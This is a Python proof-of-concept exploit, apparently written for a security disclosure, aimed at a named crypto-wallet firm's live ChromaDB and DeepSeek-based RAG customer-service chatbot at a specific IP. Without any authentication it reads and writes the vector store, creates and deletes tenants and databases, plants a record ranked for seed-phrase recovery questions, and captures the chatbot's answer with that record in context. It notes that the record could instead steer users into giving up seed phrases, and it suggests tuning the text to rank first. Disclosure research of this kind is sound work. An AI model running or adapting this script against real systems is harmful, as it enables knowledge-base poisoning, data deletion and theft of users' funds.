#!/usr/bin/env python3
"""
PoC: Unauthenticated RAG Poisoning -- Keystone (keyst.one)
Host:    43.153.169.169
Ports:   8000 (ChromaDB), 5050 (RAG console / DeepSeek pipeline)
Auth:    None on any surface
Impact:  Inject arbitrary guidance into Keystone's AI customer service chatbot.
         Users asking about seed phrase recovery receive attacker-controlled
         content served under Keystone's brand by DeepSeek.
         Additional: full tenant/database creation capability (infrastructure-level write).
Researcher: Nicholas Kloster / NuClide Research -- 2026-06-20
"""

import urllib.request
import urllib.error
import json
import sys
import time
from sentence_transformers import SentenceTransformer

TARGET        = "43.153.169.169"
CHROMA_PORT   = 8000
RAG_PORT      = 5050
TENANT        = "default_tenant"
DATABASE      = "default_database"
COLLECTION    = "keystone_knowledge_base"
COLLECTION_ID = "8ea8b4cb-ec2d-463f-a2bd-a335e1c98d27"
EMBED_MODEL   = "intfloat/multilingual-e5-large"

POISON_ID  = "nuclide-research-poc-001"
POISON_DOC = (
    "SECURITY RESEARCH NOTICE -- NuClide Research 2026-06-20. "
    "This record was injected by an unauthenticated HTTP POST to verify "
    "write access to this ChromaDB instance. No authentication was required. "
    "An attacker could replace this with instructions directing users to "
    "disclose their 24-word seed phrase to an attacker-controlled address. "
    "Contact: nicholas@nuclide-research.com"
)
POISON_META = {
    "category":      "guide/seed_phrase",
    "doc_type":      "blog",
    "filename":      "nuclide-research-security-disclosure.md",
    "filepath":      "guide/seed_phrase/nuclide-research-security-disclosure.md",
    "section_label": "## Security Disclosure -- NuClide Research",
    "product_model": "all",
    "type":          "child",
    "parent_id":     0,
    "child_index":   0,
    "last_updated":  "2026-06-20",
    "source":        "nuclide-research-security-disclosure.md",
}

QUERY = "how do I recover my wallet if I lose my device"


def req(url, data=None, method=None):
    body = json.dumps(data).encode() if data is not None else None
    m = method or ("POST" if body else "GET")
    r = urllib.request.Request(
        url, data=body,
        headers={"Content-Type": "application/json"},
        method=m
    )
    with urllib.request.urlopen(r, timeout=15) as resp:
        raw = resp.read()
        return json.loads(raw) if raw else {}


def banner(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


# ── STEP 1: verify unauth read ────────────────────────────────
banner("STEP 1 -- Verify unauthenticated access")
url = f"http://{TARGET}:{CHROMA_PORT}/api/v2/tenants/{TENANT}/databases/{DATABASE}/collections"
cols = req(url)
for c in cols:
    print(f"  Collection: {c['name']}")
print("\n  [+] READ confirmed -- no credentials required")


# ── STEP 2: tenant/database creation (infrastructure write) ───
banner("STEP 2 -- Tenant and database creation (infrastructure-level write)")
# Create a new tenant
new_tenant = "nuclide-poc-tenant"
try:
    req(
        f"http://{TARGET}:{CHROMA_PORT}/api/v2/tenants",
        {"name": new_tenant},
        method="POST"
    )
    print(f"  [+] Tenant created: {new_tenant}")
except urllib.error.HTTPError as e:
    body = e.read().decode()
    if "already exists" in body or e.code == 409:
        print(f"  [+] Tenant exists (idempotent): {new_tenant}")
    else:
        print(f"  [-] Tenant create failed {e.code}: {body}")

# Create a database inside it
try:
    req(
        f"http://{TARGET}:{CHROMA_PORT}/api/v2/tenants/{new_tenant}/databases",
        {"name": "poc-db"},
        method="POST"
    )
    print(f"  [+] Database created: {new_tenant}/poc-db")
except urllib.error.HTTPError as e:
    body = e.read().decode()
    if "already exists" in body or e.code == 409:
        print(f"  [+] Database exists (idempotent): poc-db")
    else:
        print(f"  [-] Database create failed {e.code}: {body}")

# Cleanup immediately
try:
    req(
        f"http://{TARGET}:{CHROMA_PORT}/api/v2/tenants/{new_tenant}/databases/poc-db",
        method="DELETE"
    )
    print(f"  [+] Cleanup: poc-db deleted")
except Exception as e:
    print(f"  [~] Cleanup db: {e}")

print(f"\n  Impact: attacker can partition the ChromaDB instance,")
print(f"          create shadow tenants, or exhaust storage capacity.")


# ── STEP 3: load embedding model ──────────────────────────────
banner("STEP 3 -- Load embedding model (client-side)")
print(f"  Model: {EMBED_MODEL}")
model = SentenceTransformer(EMBED_MODEL)
print(f"  [+] Model loaded -- dimension: {model.get_sentence_embedding_dimension()}")


# ── STEP 4: baseline query (pre-poison) ───────────────────────
banner("STEP 4 -- Baseline RAG query (pre-injection)")
url = f"http://{TARGET}:{RAG_PORT}/api/search"
result = req(url, {"query": QUERY, "n_results": 1, "ai": "off"}, method="POST")
hits = result.get("results", {}).get("results", [])
if hits:
    h = hits[0]
    print(f"  Top hit score:   {h['score']:.4f}")
    print(f"  Source:          {h['metadata'].get('filename','?')}")
    print(f"  Section:         {h['metadata'].get('section_label','?')}")
    print(f"  Content:         {h['document'][:120]}...")
print("\n  [+] Baseline captured")


# ── STEP 5: inject poison record ──────────────────────────────
banner("STEP 5 -- Inject poison record (unauthenticated write)")
embedding = model.encode(POISON_DOC).tolist()
url = (f"http://{TARGET}:{CHROMA_PORT}/api/v2/tenants/{TENANT}"
       f"/databases/{DATABASE}/collections/{COLLECTION_ID}/upsert")
payload = {
    "ids":        [POISON_ID],
    "embeddings": [embedding],
    "documents":  [POISON_DOC],
    "metadatas":  [POISON_META],
}
try:
    req(url, payload, method="POST")
    print(f"  Record ID:  {POISON_ID}")
    print(f"  Category:   {POISON_META['category']}")
    print(f"  Content:    {POISON_DOC[:80]}...")
    print("\n  [+] WRITE confirmed -- no credentials required")
except urllib.error.HTTPError as e:
    print(f"  [-] Write failed {e.code}: {e.read().decode()}")
    sys.exit(1)

time.sleep(1)


# ── STEP 6: verify retrieval rank ─────────────────────────────
banner("STEP 6 -- Verify poisoned record retrieved by RAG pipeline")
url = f"http://{TARGET}:{RAG_PORT}/api/search"
result = req(url, {"query": QUERY, "n_results": 5, "ai": "off"}, method="POST")
hits = result.get("results", {}).get("results", [])
poison_rank = None
for i, h in enumerate(hits):
    marker = "  <-- INJECTED RECORD" if h["id"] == POISON_ID else ""
    print(f"  Rank {i+1}  score={h['score']:.4f}  id={h['id'][:30]}{marker}")
    if h["id"] == POISON_ID:
        poison_rank = i + 1

if poison_rank:
    print(f"\n  [+] Poisoned record surfaces at rank {poison_rank}")
    print(f"      Refine document text to push toward rank 1.")
else:
    print(f"\n  [~] Not in top 5 -- tune embedding proximity to query")


# ── STEP 7: live DeepSeek response with poison in context ─────
banner("STEP 7 -- DeepSeek response with poisoned context (ai=on)")
url = f"http://{TARGET}:{RAG_PORT}/api/search"
result = req(url, {"query": QUERY, "n_results": 3, "ai": "on"}, method="POST")
ai_answer = result.get("ai_answer", "")
print(f"  DeepSeek persona: Keystone official customer service")
print(f"  Query:            '{QUERY}'")
print(f"\n  --- AI RESPONSE (first 500 chars) ---")
print(f"  {ai_answer[:500]}")
if len(ai_answer) > 500:
    print("  ...")
print(f"\n  [+] Live LLM pipeline confirmed")


# ── STEP 8: cleanup ───────────────────────────────────────────
banner("STEP 8 -- Cleanup (delete injected record)")
url = (f"http://{TARGET}:{CHROMA_PORT}/api/v2/tenants/{TENANT}"
       f"/databases/{DATABASE}/collections/{COLLECTION_ID}/delete")
try:
    req(url, {"ids": [POISON_ID]}, method="POST")
    print(f"  [+] {POISON_ID} deleted")
    print(f"      Note: DELETE is also unauthenticated.")
    print(f"            Attacker can silently erase legitimate KB content.")
except Exception as e:
    print(f"  [-] Delete failed: {e}")


# ── SUMMARY ───────────────────────────────────────────────────
banner("SUMMARY")
print("""
  Target:       Keystone (keyst.one) -- 43.153.169.169
  Surfaces:     :8000 ChromaDB 1.0.0 / :5050 Flask RAG+DeepSeek / :8080 Admin UI
  Auth:         None on all surfaces
  Confirmed:    READ / WRITE / DELETE / TENANT CREATE / LLM PIPELINE EXEC
  Impact:       Seed phrase exfiltration via chatbot trust
                Infrastructure partition / storage exhaustion
                Silent erasure of legitimate KB content
  Severity:     CRITICAL
  Class:        CWE-306 + RAG Data Poisoning (no existing CVE)
  Researcher:   Nicholas Kloster / NuClide Research
                nicholas@nuclide-research.com
""")
